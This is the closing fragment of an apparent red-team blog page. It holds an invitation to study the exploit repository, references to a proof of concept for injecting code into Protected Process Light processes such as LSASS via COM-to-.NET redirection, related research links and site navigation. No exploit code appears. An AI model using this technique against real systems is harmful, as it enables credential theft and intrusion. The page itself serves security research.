page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Feel free to dive into the repository for a deeper look into how this exploit was constructed and the techniques that were applied. Your feedback and contributions are always welcome as we continue to explore and secure these complex systems.</p><h2 id="references" class="text-xl @xs:text-2xl @lg:text-3xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[1em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-tight" aria-label="Direct link to heading" href="https://mohamed-fakroud.gitbook.io/red-teamings-dojo/abusing-idispatch-for-trapped-com-object-access-and-injecting-into-ppl-processes#references"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_on8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_on8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-tight">references</div></h2><div class="mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0 relative overflow-hidden after:block after:absolute after:-inset-0 rounded-corners:rounded-sm circular-corners:rounded-2xl after:border-tint-subtle after:border after:rounded circular-corners:after:rounded-2xl rounded-corners:after:rounded-sm dark:after:mix-blend-plus-lighter after:pointer-events-none"><a class="group flex flex-row justify-between items-center gap-4 ring-1 ring-tint-subtle rounded-sm straight-corners:rounded-none circular-corners:rounded-2xl px-5 py-3 transition-shadow hover:ring-primary-hover" href="https://github.com/T3nb3w/ComDotNetExploit"><img alt="Logo" loading="lazy" src="https://mohamed-fakroud.gitbook.io/red-teamings-dojo/~gitbook/image?url=https%3A%2F%2Fgithub.com%2Ffluidicon.png&amp;width=20&amp;dpr=3&amp;quality=100&amp;sign=e9ef2d46&amp;sv=2" class="w-5 h-5 block"><span class="flex flex-col flex-1"><span class="text-base transition-colors group-hover:text-primary">GitHub - T3nb3w/ComDotNetExploit: A C++ proof of concept demonstrating the exploitation of Windows Protected Process Light (PPL) by leveraging COM-to-.NET redirection and reflection techniques for code injection. This PoC showcases bypassing code integrity checks and loading malicious payloads in highly protected processes such as LSASS. Based on research from James Forshaw.</span><span class="text-xs text-tint">GitHub</span></span><svg class="gb-icon size-3 text-tint transition-all group-hover:translate-x-0.5 group-hover:text-primary"><title>chevron-right</title><defs><mask id="_R_1op8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-right.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_1op8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0 relative overflow-hidden after:block after:absolute after:-inset-0 rounded-corners:rounded-sm circular-corners:rounded-2xl after:border-tint-subtle after:border after:rounded circular-corners:after:rounded-2xl rounded-corners:after:rounded-sm dark:after:mix-blend-plus-lighter after:pointer-events-none"><a class="group flex flex-row justify-between items-center gap-4 ring-1 ring-tint-subtle rounded-sm straight-corners:rounded-none circular-corners:rounded-2xl px-5 py-3 transition-shadow hover:ring-primary-hover" href="https://googleprojectzero.blogspot.com/2025/01/windows-bug-class-accessing-trapped-com.html"><img alt="Logo" loading="lazy" src="https://mohamed-fakroud.gitbook.io/red-teamings-dojo/~gitbook/image?url=https%3A%2F%2Fprojectzero.google%2Fimages%2Fproject-zero.svg&amp;width=20&amp;dpr=3&amp;quality=100&amp;sign=b6c9c41b&amp;sv=2" class="w-5 h-5 block"><span class="flex flex-col flex-1"><span class="text-base transition-colors group-hover:text-primary">Windows Bug Class: Accessing Trapped COM Objects with IDispatch - Project Zero</span><span class="text-xs text-tint">googleprojectzero.blogspot.com</span></span><svg class="gb-icon size-3 text-tint transition-all group-hover:translate-x-0.5 group-hover:text-primary"><title>chevron-right</title><defs><mask id="_R_1or8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-right.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_1or8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0 relative overflow-hidden after:block after:absolute after:-inset-0 rounded-corners:rounded-sm circular-corners:rounded-2xl after:border-tint-subtle after:border after:rounded circular-corners:after:rounded-2xl rounded-corners:after:rounded-sm dark:after:mix-blend-plus-lighter after:pointer-events-none"><a class="group flex flex-row justify-between items-center gap-4 ring-1 ring-tint-subtle rounded-sm straight-corners:rounded-none circular-corners:rounded-2xl px-5 py-3 transition-shadow hover:ring-primary-hover" href="https://github.com/tyranid/IE11SandboxEscapes/blob/master/CVE-2014-0257/CVE-2014-0257.cpp"><img alt="Logo" loading="lazy" src="https://mohamed-fakroud.gitbook.io/red-teamings-dojo/~gitbook/image?url=https%3A%2F%2Fgithub.com%2Ffluidicon.png&amp;width=20&amp;dpr=3&amp;quality=100&amp;sign=e9ef2d46&amp;sv=2" class="w-5 h-5 block"><span class="flex flex-col flex-1"><span class="text-base transition-colors group-hover:text-primary">IE11SandboxEscapes/CVE-2014-0257/CVE-2014-0257.cpp at master · tyranid/IE11SandboxEscapes</span><span class="text-xs text-tint">GitHub</span></span><svg class="gb-icon size-3 text-tint transition-all group-hover:translate-x-0.5 group-hover:text-primary"><title>chevron-right</title><defs><mask id="_R_1ot8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-right.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_1ot8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start"><a class="underline decoration-[max(0.07em,1px)] underline-offset-2 links-accent:underline-offset-4 links-default:decoration-primary/6 links-default:text-primary-subtle hover:links-default:text-primary-strong contrast-more:links-default:text-primary contrast-more:hover:links-default:text-primary-strong links-accent:decoration-primary-subtle hover:links-accent:decoration-[3px] hover:links-accent:[text-decoration-skip-ink:none] transition-all duration-100" data-state="closed" href="https://learn.microsoft.com/en-us/windows/win32/api/oaidl/nf-oaidl-idispatch-gettypeinfo">https://learn.microsoft.com/en-us/windows/win32/api/oaidl/nf-oaidl-idispatch-gettypeinfo<svg class="gb-icon ml-0.5 inline size-3 links-accent:text-tint-subtle"><title>arrow-up-right</title><defs><mask id="_R_j8v8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/arrow-up-right.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_j8v8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></p></div><div class="flex flex-col md:flex-row mt-6 gap-2 max-w-3xl page-width-wide:max-w-screen-2xl mx-auto text-tint"><a class="group text-sm p-2.5 flex gap-4 flex-1 flex-row-reverse items-center pl-4 border border-tint-subtle rounded-sm circular-corners:rounded-2xl straight-corners:rounded-none hover:border-primary text-pretty md:p-4 md:text-base" href="https://mohamed-fakroud.gitbook.io/red-teamings-dojo/windows-internals/peb"><span class="flex flex-col flex-1 text-right"><span class="text-xs">Previous</span><span class="text-tint-strong group-hover:text-primary line-clamp-2">Digging into Windows PEB</span></span><svg class="gb-icon hidden size-4 text-tint-subtle contrast-more:text-tint-strong group-hover:text-primary md:block"><title>chevron-left</title><defs><mask id="_R_4qqav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-left.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_4qqav5ukqiv5ubsnpfivb_)"></rect></svg></a><a class="group text-sm p-2.5 flex gap-4 flex-1 flex-row items-center pr-4 border border-tint-subtle rounded-sm circular-corners:rounded-2xl straight-corners:rounded-none hover:border-primary text-pretty md:p-4 md:text-base" href="https://mohamed-fakroud.gitbook.io/red-teamings-dojo/c++/polymorphism-and-virtual-function-reversal-in-c++"><span class="flex flex-col flex-1"><span class="text-xs">Next</span><span class="text-tint-strong group-hover:text-primary line-clamp-2">Polymorphism and Virtual Function Reversal in C++</span></span><svg class="gb-icon hidden size-4 text-tint-subtle contrast-more:text-tint-strong group-hover:text-primary md:block"><title>chevron-right</title><defs><mask id="_R_5aqav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-right.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_5aqav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="mx-auto mt-6 page-api-block:ml-0 flex max-w-3xl page-full-width:max-w-screen-2xl flex-row flex-wrap items-center gap-4 text-tint contrast-more:text-tint-strong"><p class="mr-auto text-sm ">Last updated <time data-visual-test="transparent" datetime="2025-03-15T10:31:08.801Z" data-state="closed">11 months ago</time></p></div></main></div></div><!--$--><!--/$--></div></div></body></html>